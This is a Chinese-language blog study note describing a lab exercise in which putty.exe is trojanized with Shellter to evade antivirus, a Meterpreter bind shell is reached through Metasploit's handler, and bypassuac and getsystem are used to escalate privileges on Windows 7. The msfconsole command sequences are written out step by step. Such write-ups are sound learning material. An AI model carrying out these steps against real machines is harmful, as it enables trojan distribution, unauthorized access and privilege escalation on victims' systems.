<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Metasploit 基础使用 handler 连接 win7 并提权清除日志 | ha0zi 的分享</title>
<meta name=keywords content="信息安全,Linux"><meta name=description content="简介 目前根据 i 春秋 进行学习,目前到利用 shellter 进行文件捆绑木马并达到免查杀的效果, 在使用 metasploit 对指定目标机进行监听获取权限.利用打包好的漏洞程序进行提权并清除日志信息.这里我们的步骤是根据这个 来源 学习进行的.
操作环境 kali 2020.4 shellter 7.2-amd64 wine \ wine64 \ wine32 metasploit 6.0.18-dev win 7 企业版 注:请特别注意关闭 win7 的防火墙,不要说为什么我的没有用连接不上 具体操作 首先下载 putty.exe , 使用 shellter 进行木马封装,记住这些我们都是在 kali 虚拟机下完成的; kali 2020.4 并没有预安装 shellter 使用了 sudo apt-get install shellter 进行安装, 安装完了之后控制台返回了一个错误信息,希望我们添加 32 位的资源并且下载 wine32 (这里的具体命令我记得并不是很清晰了,请自行看控制台).
安装好了 shellter 之后我们在终端输入 sudo shellter 会出现一个新的窗口, 这里会出现一些选择 (请参考下图), 目前我了解的 a 代表的是 auto 自动的意思. 而这里的 m 似乎代表的是 manual, 这里我们仅说明自动的操作."><meta name=author content="ha0zi"><link rel=canonical href=https://www.ha0zi.com/study-notes/linux/utils/20201211-linux-util-metasploit-base-use-hanler-win7-rightescalation/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://www.ha0zi.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://www.ha0zi.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://www.ha0zi.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://www.ha0zi.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://www.ha0zi.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://www.ha0zi.com/study-notes/linux/utils/20201211-linux-util-metasploit-base-use-hanler-win7-rightescalation/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Metasploit 基础使用 handler 连接 win7 并提权清除日志"><meta property="og:description" content="简介 目前根据 i 春秋 进行学习,目前到利用 shellter 进行文件捆绑木马并达到免查杀的效果, 在使用 metasploit 对指定目标机进行监听获取权限.利用打包好的漏洞程序进行提权并清除日志信息.这里我们的步骤是根据这个 来源 学习进行的.
操作环境 kali 2020.4 shellter 7.2-amd64 wine \ wine64 \ wine32 metasploit 6.0.18-dev win 7 企业版 注:请特别注意关闭 win7 的防火墙,不要说为什么我的没有用连接不上 具体操作 首先下载 putty.exe , 使用 shellter 进行木马封装,记住这些我们都是在 kali 虚拟机下完成的; kali 2020.4 并没有预安装 shellter 使用了 sudo apt-get install shellter 进行安装, 安装完了之后控制台返回了一个错误信息,希望我们添加 32 位的资源并且下载 wine32 (这里的具体命令我记得并不是很清晰了,请自行看控制台).
安装好了 shellter 之后我们在终端输入 sudo shellter 会出现一个新的窗口, 这里会出现一些选择 (请参考下图), 目前我了解的 a 代表的是 auto 自动的意思. 而这里的 m 似乎代表的是 manual, 这里我们仅说明自动的操作."><meta property="og:type" content="article"><meta property="og:url" content="https://www.ha0zi.com/study-notes/linux/utils/20201211-linux-util-metasploit-base-use-hanler-win7-rightescalation/"><meta property="og:image" content="https://www.ha0zi.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="study-notes"><meta property="article:published_time" content="2020-12-11T15:55:33+08:00"><meta property="article:modified_time" content="2020-12-11T15:55:33+08:00"><meta property="og:site_name" content="ExampleSite"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.ha0zi.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Metasploit 基础使用 handler 连接 win7 并提权清除日志"><meta name=twitter:description content="简介 目前根据 i 春秋 进行学习,目前到利用 shellter 进行文件捆绑木马并达到免查杀的效果, 在使用 metasploit 对指定目标机进行监听获取权限.利用打包好的漏洞程序进行提权并清除日志信息.这里我们的步骤是根据这个 来源 学习进行的.
操作环境 kali 2020.4 shellter 7.2-amd64 wine \ wine64 \ wine32 metasploit 6.0.18-dev win 7 企业版 注:请特别注意关闭 win7 的防火墙,不要说为什么我的没有用连接不上 具体操作 首先下载 putty.exe , 使用 shellter 进行木马封装,记住这些我们都是在 kali 虚拟机下完成的; kali 2020.4 并没有预安装 shellter 使用了 sudo apt-get install shellter 进行安装, 安装完了之后控制台返回了一个错误信息,希望我们添加 32 位的资源并且下载 wine32 (这里的具体命令我记得并不是很清晰了,请自行看控制台).
安装好了 shellter 之后我们在终端输入 sudo shellter 会出现一个新的窗口, 这里会出现一些选择 (请参考下图), 目前我了解的 a 代表的是 auto 自动的意思. 而这里的 m 似乎代表的是 manual, 这里我们仅说明自动的操作."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Study-Notes","item":"https://www.ha0zi.com/study-notes/"},{"@type":"ListItem","position":2,"name":"Metasploit 基础使用 handler 连接 win7 并提权清除日志","item":"https://www.ha0zi.com/study-notes/linux/utils/20201211-linux-util-metasploit-base-use-hanler-win7-rightescalation/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Metasploit 基础使用 handler 连接 win7 并提权清除日志","name":"Metasploit 基础使用 handler 连接 win7 并提权清除日志","description":"简介 目前根据 i 春秋 进行学习,目前到利用 shellter 进行文件捆绑木马并达到免查杀的效果, 在使用 metasploit 对指定目标机进行监听获取权限.利用打包好的漏洞程序进行提权并清除日志信息.这里我们的步骤是根据这个 来源 学习进行的.\n操作环境 kali 2020.4 shellter 7.2-amd64 wine \\ wine64 \\ wine32 metasploit 6.0.18-dev win 7 企业版 注:请特别注意关闭 win7 的防火墙,不要说为什么我的没有用连接不上 具体操作 首先下载 putty.exe , 使用 shellter 进行木马封装,记住这些我们都是在 kali 虚拟机下完成的; kali 2020.4 并没有预安装 shellter 使用了 sudo apt-get install shellter 进行安装, 安装完了之后控制台返回了一个错误信息,希望我们添加 32 位的资源并且下载 wine32 (这里的具体命令我记得并不是很清晰了,请自行看控制台).\n安装好了 shellter 之后我们在终端输入 sudo shellter 会出现一个新的窗口, 这里会出现一些选择 (请参考下图), 目前我了解的 a 代表的是 auto 自动的意思. 而这里的 m 似乎代表的是 manual, 这里我们仅说明自动的操作.","keywords":["信息安全","Linux"],"articleBody":"简介 目前根据 i 春秋 进行学习,目前到利用 shellter 进行文件捆绑木马并达到免查杀的效果, 在使用 metasploit 对指定目标机进行监听获取权限.利用打包好的漏洞程序进行提权并清除日志信息.这里我们的步骤是根据这个 来源 学习进行的.\n操作环境 kali 2020.4 shellter 7.2-amd64 wine \\ wine64 \\ wine32 metasploit 6.0.18-dev win 7 企业版 注:请特别注意关闭 win7 的防火墙,不要说为什么我的没有用连接不上 具体操作 首先下载 putty.exe , 使用 shellter 进行木马封装,记住这些我们都是在 kali 虚拟机下完成的; kali 2020.4 并没有预安装 shellter 使用了 sudo apt-get install shellter 进行安装, 安装完了之后控制台返回了一个错误信息,希望我们添加 32 位的资源并且下载 wine32 (这里的具体命令我记得并不是很清晰了,请自行看控制台).\n安装好了 shellter 之后我们在终端输入 sudo shellter 会出现一个新的窗口, 这里会出现一些选择 (请参考下图), 目前我了解的 a 代表的是 auto 自动的意思. 而这里的 m 似乎代表的是 manual, 这里我们仅说明自动的操作. 选择自动模式后我们输入一个 绝对路径 (这里如果没有使用 root 权限执行 shellter 那么会提示让你权限不足).\n我们设置好了文件路径之后,继续输入 y 以及英文字母 l, 这时候需要选择具体的连接方式\nMeterpreter_Reverse_TCP Meterpreter_Reverse_HTTP Meterpreter_Reverse_HTTPS Meterpreter_Bind_TCP Shell_Reverse_TCP Shell_Bind_Tcp WinExec 首先我们说明选项中带有 Meterperter 表示支持使用 Metasploit 中的模块(推荐,提权之类的需要,漏洞利用); Shell 顾名思义就是一个 shell 对话框; 这里面还有 Reverse 和 Bind 这两种模式 反向连接 和 正向连接, 反向的意思是目标机运行文件之后主动连接我们, 正向是目标运行文件之后开放端口等待我们进行连接. 这里教程选择 4, 这里暂不做扩展.\n后续输入的 0.0.0.0 表示任何 IP 都可以访问, 65500 代表开放的端口等待控制\n这里我们需要运行 Metasploit 使用指定模块进行目标机的监听\nmsfconsole\nuse exploit/multi/handler\nset payload windows/meterpreter/bind_tcp\nshow options\nset RHOST [IP]\n请替换成你目标机的 IP, 不懂的话可以点击 win7 系统桌面下角的开始按键, 输入 cmd 你会获得一个黑窗口输入 ipconfig set LPORT 65500\n这个 65500 是根据三方第三张图中 shellter 之前设置的 exploit\n目标机被执行了我们的程序之后我们的监听状态的就会自动连接,但是现在的执行的用户并不总是 Administrator 那么我们就需要提权,我们可以先执行 background 然后使用 exploit/windows/local/bypassuac 这个模板进行提权,源博客 提权教程博客.\nmeterpreter \u003e background msf6 exploit(multi/handler) \u003e exploit/windows/local/bypassuac msf6 exploit(windows/local/bypassuac) \u003e sessions -l#这个会显示当前监听连接的列表以便 exploit/windows/local/bypassuac 的 session 参数赋值 msf6 exploit(windows/local/bypassuac) \u003e set SESSION 1 msf6 exploit(windows/local/bypassuac) \u003e sessions 1 meterpreter \u003e getuid meterpreter \u003e getsystem ","wordCount":"193","inLanguage":"en","image":"https://www.ha0zi.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2020-12-11T15:55:33+08:00","dateModified":"2020-12-11T15:55:33+08:00","author":{"@type":"Person","name":"ha0zi"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.ha0zi.com/study-notes/linux/utils/20201211-linux-util-metasploit-base-use-hanler-win7-rightescalation/"},"publisher":{"@type":"Organization","name":"ha0zi 的分享","logo":{"@type":"ImageObject","url":"https://www.ha0zi.com/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.ha0zi.com/ accesskey=h title="首页 (Alt + H)"><img src=https://www.ha0zi.com/ha0zi_1.png alt aria-label=logo height=35>首页</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://www.ha0zi.com/categories/ title=分类><span>分类</span></a></li><li><a href=https://www.ha0zi.com/tags/ title=标签><span>标签</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://www.ha0zi.com/>Home</a>&nbsp;»&nbsp;<a href=https://www.ha0zi.com/study-notes/>Study-Notes</a></div><h1 class="post-title entry-hint-parent">Metasploit 基础使用 handler 连接 win7 并提权清除日志
<span class=entry-hint title=Draft><svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentcolor"><path d="M160-410v-60h3e2v60H160zm0-165v-60h470v60H160zm0-165v-60h470v60H160zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22-4.5 22.5T862.09-380L643-160H520zm3e2-263-37-37 37 37zM580-220h38l121-122-18-19-19-18-122 121v38zm141-141-19-18 37 37-18-19z"/></svg></span></h1><div class=post-meta><span title='2020-12-11 15:55:33 +0800 CST'>December 11, 2020</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;193 words&nbsp;·&nbsp;ha0zi</div></header><div class=post-content><h4 id=简介>简介<a hidden class=anchor aria-hidden=true href=#简介>#</a></h4><p>目前根据 <a href=https://www.ichunqiu.com/course/58625>i 春秋</a> 进行学习,目前到利用 <a href=https://www.shellterproject.com/download/>shellter</a> 进行文件捆绑木马并达到免查杀的效果, 在使用 <a href="https://baike.baidu.com/item/Metasploit/4926164?fr=aladdin">metasploit</a> 对指定目标机进行监听获取权限.利用打包好的漏洞程序进行提权并清除日志信息.这里我们的步骤是根据这个 <a href="http://codefocus.top/?p=121">来源</a> 学习进行的.</p><hr><h4 id=操作环境>操作环境<a hidden class=anchor aria-hidden=true href=#操作环境>#</a></h4><ul><li>kali 2020.4</li><li>shellter 7.2-amd64<ul><li>wine \ wine64 \ wine32</li></ul></li><li>metasploit 6.0.18-dev</li><li>win 7 企业版</li><li>注:请特别注意关闭 <em>win7</em> 的防火墙,不要说为什么我的没有用连接不上</li></ul><hr><h4 id=具体操作>具体操作<a hidden class=anchor aria-hidden=true href=#具体操作>#</a></h4><p>首先下载 <a href=https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe title=这个是官网的下载链接,如果下载网速有问题的请自行寻找资源>putty.exe</a> , 使用 <em>shellter</em> 进行木马封装,记住这些我们都是在 <em>kali</em> 虚拟机下完成的; <em>kali 2020.4</em> 并没有预安装 <em>shellter</em> 使用了 <code>sudo apt-get install shellter</code> 进行安装, 安装完了之后控制台返回了一个错误信息,希望我们添加 <em>32</em> 位的资源并且下载 <em>wine32</em> (这里的具体命令我记得并不是很清晰了,请自行看控制台).</p><p>安装好了 <em>shellter</em> 之后我们在终端输入 <code>sudo shellter</code> 会出现一个新的窗口, 这里会出现一些选择 (请参考下图), 目前我了解的 <code>a</code> 代表的是 <em>auto</em> 自动的意思. 而这里的 <code>m</code> 似乎代表的是 <em>manual</em>, 这里我们仅说明自动的操作. 选择自动模式后我们输入一个 <a href="https://baike.baidu.com/item/%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84/481185?fr=aladdin">绝对路径</a> (这里如果没有使用 <em>root</em> 权限执行 <em>shellter</em> 那么会提示让你权限不足).</p><p><img loading=lazy src=https://images.ha0zi.com/note/2024/04/27/image-20240427214157637.png alt=shellter-1></p><p>我们设置好了文件路径之后,继续输入 <code>y</code> 以及英文字母 <code>l</code>, 这时候需要选择具体的连接方式</p><ul><li><em>Meterpreter_Reverse_TCP</em></li><li><em>Meterpreter_Reverse_HTTP</em></li><li><em>Meterpreter_Reverse_HTTPS</em></li><li><em>Meterpreter_Bind_TCP</em></li><li><em>Shell_Reverse_TCP</em></li><li><em>Shell_Bind_Tcp</em></li><li><em>WinExec</em></li></ul><p>首先我们说明选项中带有 <em>Meterperter</em> 表示支持使用 <em>Metasploit</em> 中的模块(推荐,提权之类的需要,漏洞利用); <em>Shell</em> 顾名思义就是一个 <em>shell</em> 对话框; 这里面还有 <em>Reverse</em> 和 <em>Bind</em> 这两种模式 <strong>反向连接</strong> 和 <strong>正向连接</strong>, 反向的意思是目标机运行文件之后主动连接我们, 正向是目标运行文件之后开放端口等待我们进行连接. 这里教程选择 <em>4</em>, 这里暂不做扩展.</p><p>后续输入的 <em>0.0.0.0</em> 表示任何 <em>IP</em> 都可以访问, <em>65500</em> 代表开放的端口等待控制</p><p><img loading=lazy src=https://images.ha0zi.com/note/2024/04/27/image-20240427214034077.png alt=shellter-2></p><p><img loading=lazy src=https://images.ha0zi.com/note/2024/04/27/image-20240427213932554.png alt=shellter-3></p><p>这里我们需要运行 <em>Metasploit</em> 使用指定模块进行目标机的监听</p><ul><li><p><code>msfconsole</code></p></li><li><p><code>use exploit/multi/handler</code></p></li><li><p><code>set payload windows/meterpreter/bind_tcp</code></p></li><li><p><code>show options</code></p></li><li><p><code>set RHOST [IP]</code></p><ul><li>请替换成你目标机的 <em>IP</em>, 不懂的话可以点击 <em>win7</em> 系统桌面下角的开始按键, 输入 <code>cmd</code> 你会获得一个黑窗口输入 <code>ipconfig</code></li></ul></li><li><p><code>set LPORT 65500</code></p><ul><li>这个 <em>65500</em> 是根据三方第三张图中 <em>shellter</em> 之前设置的</li></ul></li><li><p><code>exploit</code></p></li></ul><p><img loading=lazy src=https://images.ha0zi.com/note/2024/04/27/image-20240427213834790.png alt=msfconsole-1></p><p>目标机被执行了我们的程序之后我们的监听状态的就会自动连接,但是现在的执行的用户并不总是 <em>Administrator</em> 那么我们就需要提权,我们可以先执行 <code>background</code> 然后使用 <em>exploit/windows/local/bypassuac</em> 这个模板进行提权,源博客 <a href="http://codefocus.top/?m=201704">提权教程博客</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>meterpreter &gt; background
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; exploit/windows/local/bypassuac
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/local/bypassuac<span class=o>)</span> &gt; sessions -l#这个会显示当前监听连接的列表以便 exploit/windows/local/bypassuac 的 session 参数赋值
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/local/bypassuac<span class=o>)</span> &gt; <span class=nb>set</span> SESSION <span class=m>1</span>
</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/local/bypassuac<span class=o>)</span> &gt; sessions <span class=m>1</span>
</span></span><span class=line><span class=cl>meterpreter &gt; getuid
</span></span><span class=line><span class=cl>meterpreter &gt; getsystem
</span></span></code></pre></div><p><img loading=lazy src=https://images.ha0zi.com/note/2024/04/27/image-20240427213414117.png alt=msfconsole-2></p><p><img loading=lazy src=https://images.ha0zi.com/note/2024/04/27/image-20240427213617060.png alt=msfconsole-3></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://www.ha0zi.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/>信息安全</a></li><li><a href=https://www.ha0zi.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/>信息安全</a></li><li><a href=https://www.ha0zi.com/tags/linux/>Linux</a></li><li><a href=https://www.ha0zi.com/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://www.ha0zi.com/>ha0zi 的分享</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>